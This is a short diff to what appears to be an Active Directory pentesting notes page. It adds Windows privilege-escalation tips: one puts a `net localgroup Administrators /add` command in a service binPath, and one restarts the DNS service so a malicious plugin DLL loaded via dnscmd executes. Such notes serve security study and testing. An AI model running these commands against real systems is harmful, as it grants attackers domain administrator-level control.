@@ -69,6 +69,7 @@ pagetitle: Active Directory Information
 		- Server Operators
 			- Can modify service binaries and restart them
 			- `sc.exe config YourServiceName binPath= "C:\path\to\malicious\binary.exe"`
+				- Can also just put commands in `binPath`, like `cmd /c net localgroup Administrators /add {user}`
 			- `sc.exe start YourServiceName`
 		- Print Operators
 			- Can be good for DLL hijacking
@@ -84,6 +85,7 @@ pagetitle: Active Directory Information
 		- Dns Admins
 			- Can perform dll hijacking to priv esc
 			- `dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll`
+			- DLL will execute on next DNS restart (we can `sc {stop/start} dns`)
 
 
 ## Enumeration with PowerView
